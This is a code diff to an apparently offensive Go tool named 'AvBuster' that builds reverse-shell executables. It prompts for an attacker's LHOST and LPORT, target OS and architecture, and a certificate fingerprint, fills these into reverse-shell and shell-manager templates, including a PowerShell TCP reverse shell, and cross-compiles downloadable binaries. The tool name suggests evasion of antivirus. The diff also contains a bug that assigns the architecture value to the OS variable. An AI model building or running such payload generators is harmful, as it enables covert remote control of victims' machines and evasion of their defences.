@@ -11,7 +11,6 @@ import (
 	"path/filepath"
 	"runtime"
 	"strings"
-	"time"
 
 	"./binarytemplates"
 
@@ -47,6 +46,7 @@ func init() {
 
 }
 func main() {
+	var outpath, manageroutpath string
 	ylw := color.New(color.FgHiYellow, color.Bold)
 	gr := color.New(color.FgHiGreen, color.Bold)
 	rd := color.New(color.FgHiRed, color.Bold)
@@ -69,18 +69,16 @@ func main() {
 		choice, _ = options.ReadString('\n')
 		choice = removenewline(choice)
 		finflag := make(chan string)
-		outpath := filepath.FromSlash("outfiles/gotcprevshell.go")
-		manageroutpath := filepath.FromSlash("outfiles/gotcprevshellmanager.go")
 
 		if choice == "1" {
 			usrvals = readvalues(choice)
-			go createavbusterpayload(usrvals.lhost+":"+usrvals.lport, binarytemplates.AvBusterTCPSimpleGoReverseShell, usrvals.saveas, outpath, usrvals.targetos, usrvals.targetarchitecture, "", finflag)
-			<-finflag
-			ylw.Println("Binary is ready to use @ " + dwnloadlink.Link)
-			go createavbusterpayload(usrvals.lport, binarytemplates.AvBusterTCPSimpleGoReverseShellManager, usrvals.saveas+"manager", manageroutpath, usrvals.targetos, usrvals.targetarchitecture, "", finflag)
-			<-finflag
-			ylw.Println("Shellcontroller is ready to use @ " + dwnloadlink.Link)
+			outpath = filepath.FromSlash("outfiles/gotcprevshell.go")
+			manageroutpath = filepath.FromSlash("outfiles/gotcprevshellmanager.go")
+
 		} else if choice == "2" {
+			usrvals = readvalues(choice)
+			outpath = filepath.FromSlash("outfiles/hybridshell.go")
+			manageroutpath = filepath.FromSlash("outfiles/hybridmanager.go")
 		} else if choice == "3" {
 		} else if choice == "4" {
 			//go runWAFTest(geturl, finflag)
@@ -93,10 +91,20 @@ func main() {
 			//<-finflag
 		} else if choice == "7" {
 			usrvals = readvalues(choice)
-			go avbusterpstcprevshell(usrvals.lhost, usrvals.lport, usrvals.saveas, usrvals.shellcode, usrvals.targetos, usrvals.targetarchitecture, finflag)
+			outpath = filepath.FromSlash("outfiles/powrevtcp.go")
+		}
+		if choice == "7" {
+			go createavbusterpayload(usrvals.lhost, usrvals.lport, binarytemplates.AvBusterPowerShellTCPReverseShell, usrvals.saveas, outpath, usrvals.targetos, usrvals.targetarchitecture, usrvals.fingerprint, finflag)
 			<-finflag
 			ylw.Println("Binary is ready to use @ " + dwnloadlink.Link)
+		} else if choice != "0" {
 
+			go createavbusterpayload(usrvals.lhost, usrvals.lport, binarytemplates.AvBusterTCPSimpleGoReverseShell, usrvals.saveas, outpath, usrvals.targetos, usrvals.targetarchitecture, usrvals.fingerprint, finflag)
+			<-finflag
+			ylw.Println("Binary is ready to use @ " + dwnloadlink.Link)
+			go createavbusterpayload(usrvals.lhost, usrvals.lport, binarytemplates.AvBusterTCPSimpleGoReverseShellManager, usrvals.saveas+"manager", manageroutpath, usrvals.targetos, usrvals.targetarchitecture, usrvals.fingerprint, finflag)
+			<-finflag
+			ylw.Println("Shellcontroller is ready to use @ " + dwnloadlink.Link)
 		}
 	}
 }
@@ -115,6 +123,7 @@ func readvalues(choice string) UserValues {
 	ylw := color.New(color.FgHiYellow, color.Bold)
 	gr := color.New(color.FgHiGreen, color.Bold)
 	bl := color.New(color.FgHiBlue, color.Bold)
+	var fprint, selectedos, selectedarch string
 	bl.Printf("(AvBuster) > ")
 	ylw.Printf("Set LHOST : ")
 	lhost, _ := options.ReadString('\n')
@@ -123,59 +132,50 @@ func readvalues(choice string) UserValues {
 	ylw.Printf("Set LPORT : ")
 	lport, _ := options.ReadString('\n')
 	lport = removenewline(lport)
-	bl.Printf("(AvBuster) > ")
-	ylw.Printf("Save as : ")
-	saveas, _ := options.ReadString('\n')
-	saveas = removenewline(saveas)
-	bl.Printf("(AvBuster) > ")
-	ylw.Printf("OSTYPE : ")
-	gr.Printf("[1]. Windows  [2]. Linux : ")
-	ostype, _ := options.ReadString('\n')
-	ostype = removenewline(ostype)
+	if choice == "2" {
+		bl.Printf("(AvBuster) > ")
+		ylw.Printf("Cert Fingerprint : ")
+		fprint, _ = options.ReadString('\n')
+		fprint = removenewline(fprint)
+	}
+
+	if choice != "7" {
+		bl.Printf("(AvBuster) > ")
+		ylw.Printf("OSTYPE : ")
+		gr.Printf("[1]. Windows  [2]. Linux : ")
+		ostype, _ := options.ReadString('\n')
+		ostype = removenewline(ostype)
+		if ostype == "1" {
+			selectedos = "windows"
+		} else {
+			selectedos = "linux"
+		}
+	} else {
+		selectedos = "windows"
+	}
 	bl.Printf("(AvBuster) > ")
 	ylw.Printf("Architectue : ")
 	gr.Printf("[1]. 32Bit  [2]. 64Bit : ")
 	arch, _ := options.ReadString('\n')
 	arch = removenewline(arch)
+	if arch == "1" {
+		selectedarch = "386"
+	} else {
+		selectedos = "amd64"
+	}
+	bl.Printf("(AvBuster) > ")
+	ylw.Printf("Save as : ")
+	saveas, _ := options.ReadString('\n')
+	saveas = removenewline(saveas)
 	actualusrvals := UserValues{}
 	actualusrvals.lhost = lhost
 	actualusrvals.lport = lport
 	actualusrvals.saveas = saveas
-	actualusrvals.targetos = ostype
-	actualusrvals.targetarchitecture = arch
+	actualusrvals.targetos = selectedos
+	actualusrvals.targetarchitecture = selectedarch
+	actualusrvals.fingerprint = fprint
 
 	return actualusrvals
-}
-
-func avbusterpstcprevshell(rhost, rport, saveas, shellcode, ostype, arch string, finflag chan string) {
-
-	createpsrevshellpayload(rhost, rport, saveas, shellcode, ostype, arch)
-	time.Sleep(5000 * time.Millisecond)
-	dwnloadlink.Link = "download/" + saveas + ".exe"
-	os.Remove("outfiles/rev.go")
-
-	finflag <- "finished"
-
-}
-
-func createpsrevshellpayload(rhost, rport, saveas, shellcode, ostype, arch string) {
-
-	bintemplate := binarytemplates.AvBusterPowerShellTCPReverseShell
-	psrevshellgo, err := os.Create("outfiles/revpshell.go")
-	if err != nil {
-		log.Fatal(err)
-	}
-	defer psrevshellgo.Close()
-
-	replaceunwantedchars := strings.Replace(bintemplate, "RPL", "`", -1)
-	ipreplaced := strings.Replace(replaceunwantedchars, "RHOST", rhost, 1)
-	portreplaced := strings.Replace(ipreplaced, "RPORT", rport, 1)
-
-	psrevshellgo.WriteString(portreplaced)
-	//buildexe("download/"+saveas+".exe", "outfiles/revpshell.go")
-	avbusterbuildexe("download/"+saveas+".exe", "outfiles/revpshell.go", ostype, arch)
-	//buildrevshellexeforpscript()
-	//finflag <- "finished pscriptexe"
 }
 
 func avbusterbuildexe(exepath, gofilepath, ostype, arch string) {
@@ -201,8 +201,8 @@ func avbusterbuildexe(exepath, gofilepath, ostype, arch string) {
 		if err != nil {
 			log.Fatal(err)
 		}
-		buildbat.WriteString("SET GOOS=windows\n")
-		buildbat.WriteString("SET GOARCH=386\n")
+		buildbat.WriteString("SET GOOS=" + ostype + "\n")
+		buildbat.WriteString("SET GOARCH=" + arch + "\n")
 		buildbat.WriteString("go build -o " + exepath + " " + gofilepath + " " + "\n")
 		buildbat.Close()
 
@@ -296,11 +296,16 @@ func readandreplacefilecontent(ipport string) string {
 	return filestring
 }
 
-func createavbusterpayload(ipandport, binarytemplate, saveas, outfilepath, ostype, archtype, fprint string, finflag chan string) {
+func createavbusterpayload(ip, port, binarytemplate, saveas, outfilepath, ostype, archtype, fprint string, finflag chan string) {
 
+	ipandport := ip + ":" + port
 	ipandportreplaced := strings.Replace(binarytemplate, "REVIPPORT", ipandport, 1)
 	finalval := strings.Replace(ipandportreplaced, "FPRINT", fprint, 1)
-	managerfinalval := strings.Replace(finalval, "REVPRT", ipandport, 1)
+	managerfinalval := strings.Replace(finalval, "REVPRT", port, 1)
+
+	replaceunwantedchars := strings.Replace(managerfinalval, "RPL", "`", -1)
+	ipreplaced := strings.Replace(replaceunwantedchars, "RHOST", ip, 1)
+	portreplaced := strings.Replace(ipreplaced, "RPORT", port, 1)
 
 	dwnloadlink.Link = "download/" + saveas + ".exe"
 
@@ -309,7 +314,7 @@ func createavbusterpayload(ipandport, binarytemplate, saveas, outfilepath, ostyp
 		log.Fatal(err)
 	}
 	defer newFile.Close()
-	newFile.WriteString(managerfinalval)
+	newFile.WriteString(portreplaced)
 	avbusterbuildexe(dwnloadlink.Link, outfilepath, ostype, archtype)
 	finflag <- "build succeed"
 }
